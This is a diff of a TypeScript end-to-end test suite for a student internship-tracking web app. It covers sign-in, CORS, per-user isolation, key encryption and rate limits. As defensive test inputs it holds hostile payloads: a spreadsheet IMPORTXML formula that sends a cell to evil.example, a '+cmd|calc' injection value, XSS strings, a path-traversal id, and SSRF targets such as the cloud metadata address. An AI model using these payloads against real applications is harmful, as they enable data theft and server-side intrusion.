@@ -1,47 +1,19 @@
 /**
- * End-to-end tests of the BUILT server bundle (dist/Code.js equivalent),
- * running against in-memory Apps Script fakes and fixture network responses.
+ * End-to-end tests through the real HTTP handler: auth, RPC, real Postgres
+ * (PGlite) with row-level security, and fixture responses for every outside
+ * service. Each boot() is a new user in a shared database.
  */
-import vm from 'node:vm';
-import { beforeAll, describe, expect, it } from 'vitest';
-import { buildServer } from '../scripts/build.mjs';
-import { createGasGlobals } from '../tools/gas-fakes.mjs';
-import { fixtureFetch } from '../tools/fixtures.mjs';
+import { afterEach, beforeAll, describe, expect, it } from 'vitest';
+import { setPersonalSeedForTests } from '../src/server/flags';
+import { encryptText } from '../src/server/platform/crypto';
+import { fixtureFetch, sampleInbox } from '../tools/fixtures.mjs';
+import { boot, testDatabase, type FixtureFetch } from '../tools/harness';
 
-type Rpc = { ok: boolean; data?: any; error?: { code: string; message: string } };
-type Fetch = (req: { url: string; method: string; headers: Record<string, string>; payload?: string }) => { status: number; text: string };
-
-let code = '';
 beforeAll(async () => {
-  // Deterministic: mail compiled in, no private seed data.
-  code = (await buildServer({ config: { features: { mail: true }, personal: null } })).code;
+  await testDatabase();
 }, 60_000);
 
-export function boot(opts: { fetchImpl?: Fetch; html?: string; inbox?: () => unknown[]; code?: string } = {}) {
-  const created = createGasGlobals({
-    fetchImpl: (opts.fetchImpl ?? fixtureFetch) as never,
-    htmlFiles: { index: opts.html ?? '<script type="text/plain" id="iip-boot">__IIP_BOOT_B64__</script>' },
-    inbox: opts.inbox,
-  } as never);
-  const globals = created.globals;
-  const state = created.state as any;
-  const ctx = vm.createContext({ ...globals, console: { log() {}, warn() {}, error() {} } });
-  vm.runInContext(opts.code ?? code, ctx);
-  const call = (name: string, ...args: unknown[]): Rpc => JSON.parse(JSON.stringify((ctx as any)[name](...args)));
-  const ok = (name: string, ...args: unknown[]) => {
-    const r = call(name, ...args);
-    if (!r.ok) throw new Error(`${name} failed: ${r.error?.code} ${r.error?.message}`);
-    return r.data;
-  };
-  const ss = () => state.spreadsheets[state.spreadsheets.length - 1];
-  return { ctx: ctx as any, state, call, ok, ss };
-}
-
-/** Decodes the base64url boot payload doGet embeds in the page. */
-function bootData(html: string): any {
-  const raw = /id="iip-boot">([^<]*)<\/script>/.exec(html)![1]!;
-  return JSON.parse(Buffer.from(raw, 'base64url').toString('utf8'));
-}
+afterEach(() => setPersonalSeedForTests(null));
 
 const PROFILE = {
   name: 'Asha',
@@ -56,47 +28,73 @@ const PROFILE = {
   links: { github: '', linkedin: '', portfolio: '' },
 };
 
-describe('first run', () => {
-  it('creates a private spreadsheet with the v2 schema', () => {
-    const s = boot();
-    const data = s.ok('bootstrap');
+const GOOD_KEY = 'AIzaGOOD-key-for-tests-00000000';
+
+describe('sign-in and access', () => {
+  it('creates the account on first call and seeds studies and exams', async () => {
+    const s = await boot();
+    const data = await s.ok('bootstrap');
+    expect(data.user.email).toBe(s.email);
+    expect(data.user.isAdmin).toBe(false);
     expect(data.jobs).toEqual([]);
     expect(data.settings.onboarded).toBe(false);
     expect(data.settings.secrets).toEqual({ gemini: false, openai_compat: false });
-    expect(s.ss().getSheets().map((x: any) => x.getName())).toEqual(['Jobs', 'JobText', 'CoverLetters', 'Activity', 'Studies', 'Exams', 'Tasks', 'Mail']);
-    expect(s.state.props.SPREADSHEET_ID).toBe(s.ss().getId());
+    expect(data.programs.length).toBeGreaterThan(100);
+    expect(data.exams.length).toBeGreaterThan(20);
+    expect(data.features.mail).toBe(true);
+    expect(data.gmail).toBeNull();
+    const [profile] = await s.sql('select email from public.profiles where user_id = $1', [s.userId]);
+    expect(profile).toEqual({ email: s.email });
   });
 
-  it('sends the page immediately on a first visit and leaves setup to the client', () => {
-    const s = boot();
-    const out = s.ctx.doGet();
-    expect(bootData(out.getContent())).toEqual({ data: null, error: '' });
-    expect(s.state.spreadsheets).toHaveLength(0);
-    s.ok('bootstrap');
-    const again = bootData(s.ctx.doGet().getContent());
-    expect(again.data.programs.length).toBeGreaterThan(100);
+  it('rejects missing and invalid tokens', async () => {
+    const s = await boot();
+    const none = await s.request('/', { method: 'POST', body: JSON.stringify({ method: 'bootstrap', args: [] }) });
+    expect(none.status).toBe(401);
+    expect((await s.callAs('test:nope', 'bootstrap')).error?.code).toBe('UNAUTHENTICATED');
+    expect((await s.call('dropDatabase')).error?.code).toBe('BAD_INPUT');
   });
 
-  it('serves the boot payload as inert base64url text with safe framing', () => {
-    const s = boot();
-    s.ok('bootstrap');
-    const name = '</script><script>alert(1)</script> // Dhruv · ✓ https://x.y';
-    s.ok('saveProfile', { ...PROFILE, name });
-    const out = s.ctx.doGet();
-    const html = out.getContent();
-    expect(html).not.toContain('</script><script>alert');
-    expect(/id="iip-boot">([^<]*)<\/script>/.exec(html)![1]).toMatch(/^[A-Za-z0-9_=-]+$/);
-    expect(out.xframe).toBe('DEFAULT');
-    expect(bootData(html).data.profile.name).toBe(name);
+  it('answers CORS preflights only for the app itself', async () => {
+    const s = await boot();
+    const good = await s.request('/', { method: 'OPTIONS', origin: 'https://app.example' });
+    expect(good.status).toBe(204);
+    expect(good.headers.get('access-control-allow-origin')).toBe('https://app.example');
+    const evil = await s.request('/', { method: 'OPTIONS', origin: 'https://evil.example' });
+    expect(evil.status).toBe(403);
+    expect(evil.headers.get('access-control-allow-origin')).toBeNull();
+  });
+
+  it('keeps every student inside their own data', async () => {
+    const a = await boot();
+    const b = await boot();
+    const { job } = await a.ok('createJob', { company: 'Acme', role: 'ML Intern', notes: 'private note' });
+    expect((await b.call('getJob', job.id)).error?.code).toBe('NOT_FOUND');
+    expect((await b.call('updateJob', job.id, { notes: 'hijack' })).error?.code).toBe('NOT_FOUND');
+    expect((await b.ok('deleteJobs', [job.id])).deleted).toEqual([]);
+    expect((await b.ok('listJobs')).jobs).toEqual([]);
+    expect((await a.ok('getJob', job.id)).job.notes).toBe('private note');
+  });
+
+  it('reports configuration problems on /health without leaking secrets', async () => {
+    const s = await boot();
+    const ok = await s.request('/health');
+    expect(ok.status).toBe(200);
+    const broken = await boot({ env: { INTERNIQ_SECRETS_KEY: '' } });
+    const res = await broken.request('/health');
+    expect(res.status).toBe(500);
+    const body = await res.json();
+    expect(body.problems.join(' ')).toMatch(/INTERNIQ_SECRETS_KEY/);
+    expect(JSON.stringify(body)).not.toContain('sb_secret_test');
   });
 });
 
 describe('refresh pipeline', () => {
-  it('fetches, filters, scores and de-duplicates', () => {
-    const s = boot();
-    s.ok('saveProfile', PROFILE);
-    s.ok('saveSettings', { sources: { boards: [{ ats: 'greenhouse', token: 'northwind' }, { ats: 'lever', token: 'missingco' }] } });
-    const first = s.ok('refreshNow');
+  it('fetches, filters, scores and de-duplicates', async () => {
+    const s = await boot();
+    await s.ok('saveProfile', PROFILE);
+    await s.ok('saveSettings', { sources: { boards: [{ ats: 'greenhouse', token: 'northwind' }, { ats: 'lever', token: 'missingco' }] } });
+    const first = await s.ok('refreshNow');
     expect(first.report.added).toBeGreaterThan(20);
     expect(first.report.sources.find((x: any) => x.id === 'lever:missingco').error).toMatch(/404/);
     expect(first.report.sources.find((x: any) => x.id === 'greenhouse:northwind').added).toBeGreaterThan(0);
@@ -104,340 +102,383 @@ describe('refresh pipeline', () => {
     expect(jobs.every((j) => j.match && j.match.method === 'local' && j.score >= 0)).toBe(true);
     expect(jobs.some((j) => /Senior Staff/.test(j.role))).toBe(false);
     expect(jobs.some((j) => /Account Executive/.test(j.role))).toBe(false);
-    const again = s.ok('refreshNow');
+    const again = await s.ok('refreshNow');
     expect(again.report.added).toBe(0);
     expect(again.report.duplicates).toBeGreaterThan(20);
     expect(again.jobs.length).toBe(jobs.length);
   });
 
-  it('caps new postings per refresh and interleaves sources', () => {
-    const s = boot();
-    s.ok('saveProfile', PROFILE);
-    s.ok('saveSettings', { filters: { maxNewPerRefresh: 10 }, sources: { boards: [{ ats: 'greenhouse', token: 'northwind' }] } });
-    const r = s.ok('refreshNow');
+  it('caps new postings per refresh and interleaves sources', async () => {
+    const s = await boot();
+    await s.ok('saveProfile', PROFILE);
+    await s.ok('saveSettings', { filters: { maxNewPerRefresh: 10 }, sources: { boards: [{ ats: 'greenhouse', token: 'northwind' }] } });
+    const r = await s.ok('refreshNow');
     expect(r.report.added).toBe(10);
     expect(r.jobs.some((j: any) => j.source === 'greenhouse')).toBe(true);
+  });
+
+  it('shares the big SimplifyJobs feed across students through the cache', async () => {
+    const a = await boot();
+    const b = await boot();
+    await a.ok('saveProfile', PROFILE);
+    await b.ok('saveProfile', PROFILE);
+    await a.ok('refreshNow');
+    const second = await b.ok('refreshNow');
+    expect(a.state.fetched.filter((u) => /SimplifyJobs/.test(u))).toHaveLength(1);
+    expect(b.state.fetched.filter((u) => /SimplifyJobs/.test(u))).toHaveLength(0);
+    expect(second.report.added).toBeGreaterThan(20);
+  });
+
+  it('refuses to fetch private network addresses', async () => {
+    const s = await boot();
+    for (const url of ['http://localhost/admin', 'http://127.0.0.1:8080/', 'http://169.254.169.254/latest/meta-data', 'http://10.0.0.5/', 'http://[::1]/']) {
+      const r = await s.call('addFromUrl', url);
+      expect(r.ok).toBe(false);
+    }
+    expect(s.state.fetched.some((u) => /localhost|127\.0\.0\.1|169\.254|10\.0\.0\.5|::1/.test(u))).toBe(false);
   });
 });
 
 describe('jobs CRUD and safety', () => {
-  it('stores scraped text as text, never as a formula', () => {
-    const s = boot();
-    s.ok('bootstrap');
+  it('stores text exactly as typed, including formula-like and NUL-laced text', async () => {
+    const s = await boot();
     const evil = '=IMPORTXML("https://evil.example/?d="&A1,"//a")';
-    const { job } = s.ok('createJob', { company: evil, role: '+cmd|calc', notes: '@SUM(1)' });
-    const sheet = s.ss().getSheetByName('Jobs');
-    const values = sheet.getDataRange().getValues().flat();
-    expect(values.some((v: unknown) => String(v).startsWith('#FORMULA'))).toBe(false);
-    expect(values).toContain(evil);
-    const listed = s.ok('listJobs').jobs.find((j: any) => j.id === job.id);
+    const { job } = await s.ok('createJob', { company: evil, role: '+cmd|calc', notes: '@SUM(1)\u0000tail', location: '50%' });
+    const listed = (await s.ok('listJobs')).jobs.find((j: any) => j.id === job.id);
     expect(listed.company).toBe(evil);
-    expect(listed.notes).toBe('@SUM(1)');
+    expect(listed.notes).toBe('@SUM(1)tail');
+    expect(listed.location).toBe('50%');
   });
 
-  it('keeps date-like, percent-like and boolean-like text exactly as typed', () => {
-    const s = boot();
-    const { job } = s.ok('createJob', { company: 'TRUE', role: 'Jan 1', location: '50%', notes: '0042' });
-    const listed = s.ok('listJobs').jobs.find((j: any) => j.id === job.id);
-    expect([listed.company, listed.role, listed.location, listed.notes]).toEqual(['TRUE', 'Jan 1', '50%', '0042']);
-  });
-
-  it('never queues AI work when no key is configured', () => {
-    const s = boot();
-    s.ok('saveProfile', PROFILE);
-    s.ok('saveSettings', { ai: { provider: 'gemini', autoMinScore: 0 } });
-    const jobs = s.ok('refreshNow').jobs as any[];
+  it('never queues AI work when no key is configured', async () => {
+    const s = await boot();
+    await s.ok('saveProfile', PROFILE);
+    await s.ok('saveSettings', { ai: { provider: 'gemini', autoMinScore: 0 } });
+    const jobs = (await s.ok('refreshNow')).jobs as any[];
     expect(jobs.some((j) => j.aiStatus === 'queued')).toBe(false);
   });
 
-  it('rejects duplicates, bad input and unknown fields', () => {
-    const s = boot();
-    s.ok('createJob', { company: 'Acme', role: 'ML Intern', url: 'https://acme.example/1' });
-    expect(s.call('createJob', { company: 'ACME', role: 'ML Internship' }).error?.code).toBe('CONFLICT');
-    expect(s.call('createJob', { company: '', role: 'x' }).error?.code).toBe('BAD_INPUT');
-    expect(s.call('createJob', { company: 'A', role: 'B', url: 'javascript:alert(1)' }).error?.code).toBe('BAD_INPUT');
-    const id = s.ok('listJobs').jobs[0].id;
-    expect(s.call('updateJob', id, { score: 100 }).error?.code).toBe('BAD_INPUT');
-    expect(s.call('updateJob', id, { stage: 'hired' }).error?.code).toBe('BAD_INPUT');
-    expect(s.call('getJob', '../../etc').error?.code).toBe('BAD_INPUT');
-    expect(s.call('getJob', 'j_000000000000').error?.code).toBe('NOT_FOUND');
+  it('rejects duplicates, bad input and unknown fields', async () => {
+    const s = await boot();
+    await s.ok('createJob', { company: 'Acme', role: 'ML Intern', url: 'https://acme.example/1' });
+    expect((await s.call('createJob', { company: 'ACME', role: 'ML Internship' })).error?.code).toBe('CONFLICT');
+    expect((await s.call('createJob', { company: '', role: 'x' })).error?.code).toBe('BAD_INPUT');
+    expect((await s.call('createJob', { company: 'A', role: 'B', url: 'javascript:alert(1)' })).error?.code).toBe('BAD_INPUT');
+    const id = (await s.ok('listJobs')).jobs[0].id;
+    expect((await s.call('updateJob', id, { score: 100 })).error?.code).toBe('BAD_INPUT');
+    expect((await s.call('updateJob', id, { stage: 'hired' })).error?.code).toBe('BAD_INPUT');
+    expect((await s.call('getJob', '../../etc')).error?.code).toBe('BAD_INPUT');
+    expect((await s.call('getJob', 'j_000000000000')).error?.code).toBe('NOT_FOUND');
   });
 
-  it('tracks stage changes, dates and notes', () => {
-    const s = boot();
-    const { job } = s.ok('createJob', { company: 'Acme', role: 'Data Intern', description: 'SQL and Python' });
-    const applied = s.ok('updateJob', job.id, { stage: 'applied', deadline: '2026-12-01', followUpAt: '2026-12-08', notes: 'Referral' }).job;
+  it('tracks stage changes, dates and notes', async () => {
+    const s = await boot();
+    const { job } = await s.ok('createJob', { company: 'Acme', role: 'Data Intern', description: 'SQL and Python' });
+    const applied = (await s.ok('updateJob', job.id, { stage: 'applied', deadline: '2026-12-01', followUpAt: '2026-12-08', notes: 'Referral' })).job;
     expect(applied.stage).toBe('applied');
     expect(applied.appliedAt).not.toBe('');
     expect(applied.deadline).toBe('2026-12-01');
-    expect(s.call('updateJob', job.id, { deadline: 'next friday' }).error?.code).toBe('BAD_INPUT');
-    const detail = s.ok('getJob', job.id);
+    expect((await s.call('updateJob', job.id, { deadline: 'next friday' })).error?.code).toBe('BAD_INPUT');
+    const detail = await s.ok('getJob', job.id);
     expect(detail.job.description).toBe('SQL and Python');
     expect(detail.activity.some((a: any) => a.type === 'stage')).toBe(true);
   });
 
-  it('bulk-updates and deletes, including emptying the table', () => {
-    const s = boot();
-    s.ok('saveProfile', PROFILE);
-    const jobs = s.ok('refreshNow').jobs as any[];
+  it('bulk-updates and deletes, including emptying the list', async () => {
+    const s = await boot();
+    await s.ok('saveProfile', PROFILE);
+    const jobs = (await s.ok('refreshNow')).jobs as any[];
     const ids = jobs.slice(0, 15).map((j) => j.id);
-    const bulk = s.ok('bulkUpdate', ids, { stage: 'archived' });
+    const bulk = await s.ok('bulkUpdate', ids, { stage: 'archived' });
     expect(bulk.jobs.every((j: any) => j.stage === 'archived')).toBe(true);
-    expect(s.ok('deleteJobs', ids).deleted).toHaveLength(15);
-    expect(s.ok('listJobs').jobs).toHaveLength(jobs.length - 15);
-    const rest = s.ok('listJobs').jobs.map((j: any) => j.id);
-    expect(s.ok('deleteJobs', rest).deleted).toHaveLength(rest.length);
-    expect(s.ok('listJobs').jobs).toHaveLength(0);
-    expect(s.ok('createJob', { company: 'After', role: 'Intern' }).job.company).toBe('After');
+    expect((await s.ok('deleteJobs', ids)).deleted).toHaveLength(15);
+    expect((await s.ok('listJobs')).jobs).toHaveLength(jobs.length - 15);
+    const rest = (await s.ok('listJobs')).jobs.map((j: any) => j.id);
+    expect((await s.ok('deleteJobs', rest)).deleted).toHaveLength(rest.length);
+    expect((await s.ok('listJobs')).jobs).toHaveLength(0);
+    const [{ n }] = await s.sql<{ n: number }>('select count(*)::int as n from public.job_texts where user_id = $1', [s.userId]);
+    expect(n).toBe(0);
+    expect((await s.ok('createJob', { company: 'After', role: 'Intern' })).job.company).toBe('After');
   });
 
-  it('re-scores everything when the profile changes', () => {
-    const s = boot();
-    s.ok('createJob', { company: 'Acme', role: 'Rust Systems Intern', description: 'Rust, Linux, distributed systems' });
-    const before = s.ok('listJobs').jobs[0].score;
-    const after = s.ok('saveProfile', { ...PROFILE, skills: ['Rust', 'Linux', 'Distributed Systems'], targetRoles: ['Systems'] }).jobs[0].score;
+  it('re-scores everything when the profile changes', async () => {
+    const s = await boot();
+    await s.ok('createJob', { company: 'Acme', role: 'Rust Systems Intern', description: 'Rust, Linux, distributed systems' });
+    const before = (await s.ok('listJobs')).jobs[0].score;
+    const after = (await s.ok('saveProfile', { ...PROFILE, skills: ['Rust', 'Linux', 'Distributed Systems'], targetRoles: ['Systems'] })).jobs[0].score;
     expect(after).toBeGreaterThan(before);
   });
 });
 
 describe('AI', () => {
-  it('verifies keys before saving them, never exposes them', () => {
-    const s = boot();
-    expect(s.call('setSecret', 'gemini', 'AIzaBAD-key-for-tests-000000').error?.code).toBe('AI_NOT_CONFIGURED');
-    expect(s.state.props['iip.secret.gemini']).toBeUndefined();
-    const out = s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
+  it('verifies keys before saving them, encrypts them, never exposes them', async () => {
+    const s = await boot();
+    expect((await s.call('setSecret', 'gemini', 'AIzaBAD-key-for-tests-000000')).error?.code).toBe('AI_NOT_CONFIGURED');
+    expect(await s.sql('select * from public.user_secrets where user_id = $1', [s.userId])).toEqual([]);
+    const out = await s.ok('setSecret', 'gemini', GOOD_KEY);
     expect(out.settings.ai.provider).toBe('gemini');
     expect(out.settings.ai.model).toBe('gemini-flash-latest');
-    expect(JSON.stringify(s.ok('bootstrap'))).not.toContain('AIzaGOOD');
+    const [row] = await s.sql<{ ciphertext: string }>('select ciphertext from public.user_secrets where user_id = $1', [s.userId]);
+    expect(row!.ciphertext).toMatch(/^v1\./);
+    expect(row!.ciphertext).not.toContain('AIzaGOOD');
+    expect(JSON.stringify(await s.ok('bootstrap'))).not.toContain('AIzaGOOD');
+    expect((await s.ok('bootstrap')).settings.secrets.gemini).toBe(true);
   });
 
-  it('analyses in batches, sends the key in a header, and respects the daily limit', () => {
+  it('analyses in batches, sends the key in a header, and respects the daily limit', async () => {
     const seen: string[] = [];
-    const s = boot({
+    const s = await boot({
       fetchImpl: (req) => {
         if (/generativelanguage/.test(req.url)) {
           seen.push(req.url);
           expect(req.url).not.toContain('key=');
-          expect(req.headers['x-goog-api-key']).toBe('AIzaGOOD-key-for-tests-00000000');
+          expect(req.headers['x-goog-api-key']).toBe(GOOD_KEY);
         }
-        return fixtureFetch(req);
+        return (fixtureFetch as FixtureFetch)(req);
       },
     });
-    s.ok('saveProfile', PROFILE);
-    s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
-    s.ok('saveSettings', { ai: { autoAnalyze: false, dailyLimit: 2, batchSize: 5 } });
-    const jobs = s.ok('refreshNow').jobs as any[];
+    await s.ok('saveProfile', PROFILE);
+    await s.ok('setSecret', 'gemini', GOOD_KEY);
+    await s.ok('saveSettings', { ai: { autoAnalyze: false, dailyLimit: 2, batchSize: 5 } });
+    const jobs = (await s.ok('refreshNow')).jobs as any[];
     const ids = jobs.slice(0, 5).map((j) => j.id);
-    const out = s.ok('analyzeWithAi', ids);
+    const out = await s.ok('analyzeWithAi', ids);
     expect(out.jobs.filter((j: any) => j.aiStatus === 'done')).toHaveLength(5);
     expect(out.jobs[0].match.method).toBe('ai');
     expect(out.usage.aiRequests).toBe(1);
     expect(seen.filter((u) => /generateContent/.test(u))).toHaveLength(1);
-    s.ok('analyzeWithAi', jobs.slice(5, 6).map((j) => j.id));
-    expect(s.call('analyzeWithAi', jobs.slice(6, 7).map((j) => j.id)).error?.code).toBe('AI_QUOTA');
+    await s.ok('analyzeWithAi', jobs.slice(5, 6).map((j) => j.id));
+    expect((await s.call('analyzeWithAi', jobs.slice(6, 7).map((j) => j.id))).error?.code).toBe('AI_QUOTA');
   });
 
-  it('backs off on provider quota errors without losing the job', () => {
-    const s = boot({
+  it('backs off on provider quota errors without losing the job', async () => {
+    const s = await boot({
       fetchImpl: (req) =>
         /:generateContent/.test(req.url)
           ? { status: 429, text: JSON.stringify({ error: { message: 'quota', details: [{ violations: [{ quotaId: 'GenerateRequestsPerDayPerProjectPerModel-FreeTier' }] }] } }) }
-          : fixtureFetch(req),
+          : (fixtureFetch as FixtureFetch)(req),
     });
-    s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
-    const { job } = s.ok('createJob', { company: 'Acme', role: 'ML Intern', description: 'Python' });
-    const r = s.ok('analyzeWithAi', [job.id]);
+    await s.ok('setSecret', 'gemini', GOOD_KEY);
+    const { job } = await s.ok('createJob', { company: 'Acme', role: 'ML Intern', description: 'Python' });
+    const r = await s.ok('analyzeWithAi', [job.id]);
     expect(r.error).toMatch(/daily free quota/);
     expect(r.usage.cooldownUntil).not.toBe('');
-    expect(s.call('analyzeWithAi', [job.id]).error?.code).toBe('AI_QUOTA');
-    expect(s.ok('listJobs').jobs[0].match.method).toBe('local');
+    expect((await s.call('analyzeWithAi', [job.id])).error?.code).toBe('AI_QUOTA');
+    expect((await s.ok('listJobs')).jobs[0].match.method).toBe('local');
   });
 
-  it('auto-queues promising postings during refresh', () => {
-    const s = boot();
-    s.ok('saveProfile', PROFILE);
-    s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
-    s.ok('saveSettings', { ai: { autoMinScore: 40, dailyLimit: 3 } });
-    const r = s.ok('refreshNow');
+  it('auto-queues promising postings during refresh', async () => {
+    const s = await boot();
+    await s.ok('saveProfile', PROFILE);
+    await s.ok('setSecret', 'gemini', GOOD_KEY);
+    await s.ok('saveSettings', { ai: { autoMinScore: 40, dailyLimit: 3 } });
+    const r = await s.ok('refreshNow');
     expect(r.report.aiAnalyzed).toBeGreaterThan(0);
     expect(r.report.aiAnalyzed).toBeLessThanOrEqual(15);
     expect(r.usage.aiRequests).toBeLessThanOrEqual(3);
   });
 
-  it('writes cover letters with AI or an honest template without it', () => {
-    const s = boot();
-    s.ok('saveProfile', PROFILE);
-    const { job } = s.ok('createJob', { company: 'Acme', role: 'ML Intern' });
-    const local = s.ok('generateCoverLetter', job.id, { tone: 'professional', length: 'short' });
+  it('writes cover letters with AI or an honest template without it', async () => {
+    const s = await boot();
+    await s.ok('saveProfile', PROFILE);
+    const { job } = await s.ok('createJob', { company: 'Acme', role: 'ML Intern' });
+    const local = await s.ok('generateCoverLetter', job.id, { tone: 'professional', length: 'short' });
     expect(local.method).toBe('local');
     expect(local.text).toContain('Dear Acme hiring team');
-    s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
-    const ai = s.ok('generateCoverLetter', job.id, { tone: 'concise', length: 'short' });
+    await s.ok('setSecret', 'gemini', GOOD_KEY);
+    const ai = await s.ok('generateCoverLetter', job.id, { tone: 'concise', length: 'short' });
     expect(ai.method).toBe('ai');
-    expect(s.ok('getJob', job.id).coverLetter).toBe(ai.text);
+    expect((await s.ok('getJob', job.id)).coverLetter).toBe(ai.text);
   });
 });
 
-describe('automation', () => {
-  it('installs one hourly trigger, refreshes once a day and emails a digest', () => {
-    const s = boot();
-    s.ok('saveProfile', PROFILE);
-    s.ok('saveSettings', { automation: { enabled: true, hour: 0, digestThreshold: 50, timezone: 'UTC' } });
-    expect(s.state.triggers.filter((t: any) => t.handler === 'worker')).toHaveLength(1);
-    s.ok('saveSettings', { automation: { hour: 0 } });
-    expect(s.state.triggers).toHaveLength(1);
-    s.ctx.worker();
-    expect(s.ok('listJobs').jobs.length).toBeGreaterThan(0);
-    expect(s.state.mail).toHaveLength(1);
-    expect(s.state.mail[0].to).toBe('student@example.com');
-    const fetches = s.state.fetches.length;
-    s.ctx.worker();
-    expect(s.state.fetches.length).toBe(fetches);
-    expect(s.state.mail).toHaveLength(1);
-    s.ok('saveSettings', { automation: { enabled: false } });
-    expect(s.state.triggers).toHaveLength(0);
+describe('background worker', () => {
+  it('refreshes once a day at the chosen hour and then stays quiet', async () => {
+    const s = await boot();
+    await s.ok('saveProfile', PROFILE);
+    await s.ok('saveSettings', { automation: { enabled: true, hour: 0, timezone: 'UTC' } });
+    const first = await s.runWorker();
+    expect(first.did).toContain('refresh');
+    expect((await s.ok('listJobs')).jobs.length).toBeGreaterThan(0);
+    const fetches = s.state.fetched.length;
+    const second = await s.runWorker();
+    expect(second.did).not.toContain('refresh');
+    expect(s.state.fetched.length).toBe(fetches);
   });
 
-  it('retires the v1 daily trigger', () => {
-    const s = boot();
-    s.state.triggers.push({ handler: 'aggregateJobsDailyFlow', id: 'old' });
-    s.ctx.aggregateJobsDailyFlow();
-    expect(s.state.triggers).toHaveLength(0);
-  });
-});
-
-describe('upgrade from v1', () => {
-  it('converts v1 sheets in place, keeps backups, moves the key', () => {
-    const s = boot();
-    const ss = s.ctx.SpreadsheetApp.create('Internship Intelligence Platform Database');
-    const jobs = ss.insertSheet('Internships');
-    jobs.appendRow(['ID', 'Company', 'Role', 'Location', 'Source', 'URL', 'Description', 'Requirements', 'DateAdded', 'Deadline', 'AIMatchScore', 'AIRationale', 'Status', 'AppliedDate', 'ResumeVersion', 'Notes']);
-    jobs.appendRow(['JOB_1', 'Lumen', 'ML Intern', 'Remote', 'SimplifyJobs', 'https://lumen.example/1', 'PyTorch', '', '', 'Dec 1', 78, '• Strong fit', 'Interviewing', '', '', 'Met at fair']);
-    jobs.appendRow(['JOB_2', 'Kestrel', 'Data Intern', 'Pune', 'Excel Import', '', '', '', '', '', 0, 'AI model skipped', 'Offered', '', '', '']);
-    const apps = ss.insertSheet('Applications');
-    apps.appendRow(['InternshipID', 'SOPText', 'ResumeDriveLink', 'FollowUpDate']);
-    apps.appendRow(['JOB_1', 'Dear Lumen…', '', '']);
-    const prof = ss.insertSheet('UserProfile');
-    prof.appendRow(['Key', 'Value']);
-    prof.appendRow(['skills', 'Python, PyTorch']);
-    prof.appendRow(['target_roles', 'Machine Learning']);
-    s.state.props.SPREADSHEET_ID = ss.getId();
-    s.state.props.GEMINI_API_KEY = 'AIzaOLD-v1-key-000000000000000';
-
-    const data = s.ok('bootstrap');
-    expect(data.migratedFromV1).toBe(2);
-    const byRole = Object.fromEntries(data.jobs.map((j: any) => [j.role, j]));
-    expect(byRole['ML Intern'].stage).toBe('interviewing');
-    expect(byRole['ML Intern'].notes).toContain('v1 AI score 78/100');
-    expect(byRole['Data Intern'].stage).toBe('offer');
-    expect(data.profile.skills).toEqual(['Python', 'PyTorch']);
-    expect(data.settings.secrets.gemini).toBe(true);
-    expect(s.state.props.GEMINI_API_KEY).toBeUndefined();
-    expect(ss.getSheetByName('v1 backup · Internships')).not.toBeNull();
-    expect(s.ok('getJob', byRole['ML Intern'].id).coverLetter).toBe('Dear Lumen…');
-    expect(s.ok('bootstrap').migratedFromV1).toBe(2);
-    expect(s.ok('listJobs').jobs).toHaveLength(2);
+  it('only runs with the cron secret, and fans out to due users', async () => {
+    const s = await boot();
+    await s.ok('saveSettings', { automation: { enabled: true, hour: 0, timezone: 'UTC' } });
+    const denied = await s.request('/cron', { method: 'POST', headers: { 'x-cron-secret': 'guess' }, body: '{}' });
+    expect(denied.status).toBe(401);
+    const res = await s.request('/cron', { method: 'POST', headers: { 'x-cron-secret': 'cron-secret-for-tests' }, body: '{}' });
+    const body = await res.json();
+    expect(body.dispatched).toBeGreaterThanOrEqual(1);
+    expect(s.state.fetched.some((u) => u.endsWith('/functions/v1/api/cron'))).toBe(true);
   });
 });
 
 describe('limits and privacy', () => {
-  it('rate-limits expensive calls per user', () => {
-    const s = boot();
-    for (let i = 0; i < 3; i++) s.ok('refreshNow');
-    expect(s.call('refreshNow').error?.code).toBe('RATE_LIMITED');
+  it('rate-limits expensive calls per user', async () => {
+    const s = await boot();
+    for (let i = 0; i < 3; i++) await s.ok('refreshNow');
+    expect((await s.call('refreshNow')).error?.code).toBe('RATE_LIMITED');
   });
 
-  it('never leaks internals on unexpected errors', () => {
-    const s = boot({ fetchImpl: () => ({ status: 200, text: 'x' }) });
-    s.ctx.SpreadsheetApp.create = () => {
-      throw new Error('secret stack detail at line 42');
-    };
-    const r = s.call('bootstrap');
+  it('never leaks internals on unexpected errors', async () => {
+    const s = await boot({
+      wrapDb: (db) =>
+        new Proxy(db, {
+          get(target, prop, recv) {
+            if (prop === 'select') return () => Promise.reject(new Error('secret stack detail at line 42'));
+            return Reflect.get(target, prop, recv);
+          },
+        }),
+    });
+    const r = await s.call('listJobs');
     expect(r.ok).toBe(false);
     expect(r.error!.code).toBe('INTERNAL');
     expect(r.error!.message).not.toContain('secret stack');
   });
 
-  it('deletes everything on request', () => {
-    const s = boot();
-    s.ok('saveProfile', PROFILE);
-    s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
-    s.ok('createJob', { company: 'A', role: 'B' });
-    s.ok('saveSettings', { automation: { enabled: true } });
-    expect(s.call('deleteAllData', 'yes').error?.code).toBe('BAD_INPUT');
-    s.ok('deleteAllData', 'DELETE');
-    expect(Object.keys(s.state.props)).toHaveLength(0);
-    expect(s.state.triggers).toHaveLength(0);
+  it('exports everything and deletes the account on request', async () => {
+    const s = await boot();
+    await s.ok('saveProfile', PROFILE);
+    await s.ok('setSecret', 'gemini', GOOD_KEY);
+    await s.ok('createJob', { company: 'A', role: 'B', description: 'Desc' });
+    const dump = await s.ok('exportData');
+    expect(dump.jobs[0]).toMatchObject({ company: 'A', description: 'Desc' });
+    expect(JSON.stringify(dump)).not.toContain('AIzaGOOD');
+    expect((await s.call('deleteAccount', 'yes')).error?.code).toBe('BAD_INPUT');
+    await s.ok('deleteAccount', 'DELETE');
+    for (const t of ['profiles', 'jobs', 'job_texts', 'programs', 'user_kv', 'user_secrets', 'activity']) {
+      const [{ n }] = await s.sql<{ n: number }>(`select count(*)::int as n from public.${t} where user_id = $1`, [s.userId]);
+      expect(n, t).toBe(0);
+    }
   });
 });
 
-
